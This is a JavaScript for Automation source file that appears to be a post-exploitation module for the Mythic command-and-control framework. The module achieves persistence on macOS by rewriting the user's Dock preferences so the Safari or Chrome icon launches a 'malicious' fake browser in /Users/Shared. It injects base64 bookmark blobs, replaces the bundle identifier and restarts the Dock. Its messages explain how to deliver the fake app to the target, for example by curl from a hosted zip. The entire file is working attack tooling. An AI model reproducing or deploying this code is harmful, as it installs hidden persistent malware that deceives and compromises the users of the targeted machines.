function DockPersist(Browser, BundleID, ReloadNow) {
    ObjC.import('Foundation')
	ObjC.import("Cocoa")
    ObjC.import('stdlib')
    let currentApp = Application.currentApplication();
    currentApp.includeStandardAdditions = true;
    let userHome = $.getenv('HOME')

    var output = ""
    let dockPlist = userHome + "/Library/Preferences/com.apple.dock.plist"

    function reloadDock() {
        let path = "/usr/bin/killall"
        let args = ["Dock"]
        var pipe = $.NSPipe.pipe;
        var file = pipe.fileHandleForReading;
        var task = $.NSTask.alloc.init;
        task.launchPath = path;
        task.arguments = args;
        task.standardOutput = pipe;
        task.standardError = pipe;
        task.launch;
    }
//debugger;
    try {
        switch (Browser) {
            case "Safari":
                var FakeSafariExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Users/Shared/Safari.app')
                if (FakeSafariExistsCheck == true) {
                    //Due to Safari64 contents is the reason must be at /Users/Shared/
					//To change path, manually modify dock and inspect plist contents on test machine
                    var Safari64 = "Ym9va1wCAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAEAAAQAAAADAwAAAAAAIAUAAAABAQAAVXNlcnMAAAAGAAAAAQEAAFNoYXJlZAAACgAAAAEBAABTYWZhcmkuYXBwAAAMAAAAAQYAABAAAAAgAAAAMAAAAAgAAAAEAwAAfVMAAAMAAAAIAAAABAMAAH9TAAADAAAACAAAAAQDAACpDAwAAwAAAAwAAAABBgAAWAAAAGgAAAB4AAAACAAAAAAEAABBwngkSWg59xgAAAABAgAAAgAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAAAAAAAEFAAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRvc2ggSEQIAAAABAMAAABgf+sJAAAACAAAAAAEAABBwceD6M41tCQAAAABAQAAMEE4MUYzQjEtNTFEOS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAABAAAAAAAAAAAAAAABAAAAAQEAAC8AAAC0AAAA/v///wEAAAAAAAAADgAAAAQQAABEAAAAAAAAAAUQAACIAAAAAAAAABAQAACsAAAAAAAAAEAQAACcAAAAAAAAAAIgAABkAQAAAAAAAAUgAADUAAAAAAAAABAgAADkAAAAAAAAABEgAAAYAQAAAAAAABIgAAD4AAAAAAAAABMgAAAIAQAAAAAAACAgAABEAQAAAAAAADAgAADMAAAAAAAAAAHQAADMAAAAAAAAABDQAAAEAAAAAAAAAA=="
 
 					var plist = $.NSMutableDictionary.alloc.initWithContentsOfFile(dockPlist)
					var unwrapDockplist = ObjC.deepUnwrap(plist)
					var bookSafari = $.NSMutableData.alloc.initWithBase64EncodedStringOptions(Safari64,0)
					var unwrapBookSafari = ObjC.deepUnwrap(bookSafari)
					
					var arrayLength = unwrapDockplist["persistent-apps"].length;
                        for (var i = 0; i < arrayLength; i++) {
                           if (unwrapDockplist["persistent-apps"][i]["tile-data"]["bundle-identifier"] == "com.apple.Safari") {
                               unwrapDockplist["persistent-apps"][i]["tile-data"]["book"] = unwrapBookSafari
                               unwrapDockplist["persistent-apps"][i]["tile-data"]["file-data"]["_CFURLString"] = "file://Users/Shared/Safari.app"
							   unwrapDockplist["persistent-apps"][i]["tile-data"]["bundle-identifier"] = BundleID //com.apple.automator.Safari
						    }
						 }
				//save plist
				unwrapDockplist = $(unwrapDockplist)
				unwrapDockplist.writeToFileAtomically(dockPlist, true)
					
                     if (ReloadNow == "yes") {
                        reloadDock()
                    }
                    output += 'Safari Persistence installed. Successfully modified ~/Library/Preferences/com.apple.dock.plist'
                } else {
                    output += `Malicious Safari does not Exist. Upload to target
                 Options:
                     - zip file, use upload command in Mythic, then unzip to destination
                     - zip file, host somewhere, use curl to save on target, then unzip to destination
                     - zip file, base64 encode, base64 decode to save on target, then unzip to destination`
                }
                break;
            case "Google Chrome":
                var FakeChromeExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Users/Shared/Google\ Chrome.app')
                if (FakeChromeExistsCheck == true) {
                    //Due to Chrome64 contents is the reason must be at /Users/Shared/
					//To change path, manually modify dock and inspect plist contents on test machine
                    var Chrome64 = "Ym9va6ACAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAEAAAQAAAADAwAAAAAAIAUAAAABAQAAVXNlcnMAAAAGAAAAAQEAAFNoYXJlZAAAEQAAAAEBAABHb29nbGUgQ2hyb21lLmFwcAAAAAwAAAABBgAAEAAAACAAAAAwAAAACAAAAAQDAAB9UwAAAwAAAAgAAAAEAwAAf1MAAAMAAAAIAAAABAMAAIPSEAADAAAADAAAAAEGAABgAAAAcAAAAIAAAAAIAAAAAAQAAEHCeHF4d1dpGAAAAAECAAACAAAAAAAAAA8AAAAAAAAAAAAAAAAAAAAAAAAAAQUAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1hY2ludG9zaCBIRAgAAAAEAwAAAGB/6wkAAAAIAAAAAAQAAEHBx4PozjW0JAAAAAEBAAAwQTgxRjNCMS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAAAQIAAIEAAAABAAAA7xMAAAEAAAAAAAAAAAAAAAEAAAABAQAALwAAABoAAAABAQAATlNVUkxEb2N1bWVudElkZW50aWZpZXJLZXkAAAQAAAADAwAACgAAAMAAAAD+////AQAAAAAAAAAPAAAABBAAAEwAAAAAAAAABRAAAJAAAAAAAAAAEBAAALQAAAAAAAAAQBAAAKQAAAAAAAAAAiAAAGwBAAAAAAAABSAAANwAAAAAAAAAECAAAOwAAAAAAAAAESAAACABAAAAAAAAEiAAAAABAAAAAAAAEyAAABABAAAAAAAAICAAAEwBAAAAAAAAMCAAANQAAAAAAAAAAdAAANQAAAAAAAAAENAAAAQAAAAAAAAAeAEAgJwBAAAAAAAA"
 
 					var plist = $.NSMutableDictionary.alloc.initWithContentsOfFile(dockPlist)
					var unwrapDockplist = ObjC.deepUnwrap(plist)
					var bookChrome = $.NSMutableData.alloc.initWithBase64EncodedStringOptions(Chrome64,0)
					var unwrapBookChrome = ObjC.deepUnwrap(bookChrome)
					
					var arrayLength = unwrapDockplist["persistent-apps"].length;
                        for (var i = 0; i < arrayLength; i++) {
                           if (unwrapDockplist["persistent-apps"][i]["tile-data"]["bundle-identifier"] == "com.google.Chrome") {
                               unwrapDockplist["persistent-apps"][i]["tile-data"]["book"] = unwrapBookChrome
                               unwrapDockplist["persistent-apps"][i]["tile-data"]["file-data"]["_CFURLString"] = "file://Users/Shared/Google%20Chrome.app"
							   unwrapDockplist["persistent-apps"][i]["tile-data"]["bundle-identifier"] = BundleID //com.apple.automator.Chrome
						    }
						 }
				//save plist
				unwrapDockplist = $(unwrapDockplist)
				unwrapDockplist.writeToFileAtomically(dockPlist, true)
					
                     if (ReloadNow == "yes") {
                        reloadDock()
                    }
                    output += 'Chrome Persistence installed. Successfully modified ~/Library/Preferences/com.apple.dock.plist'
                } else {
                    output += `Malicious Chrome does not Exist. Upload to target
                    Options:
                        - zip file, use upload command in Mythic, then unzip to destination
                        - zip file, host somewhere, use curl to save on target, then unzip to destination
                        - zip file, base64 encode, base64 decode to save on target, then unzip to destination`
                }
                break;
            default:
                output += "Please Select Safari or Chrome"
        }
    } catch (error) {
        output += error.toString()
    }
    return output
}
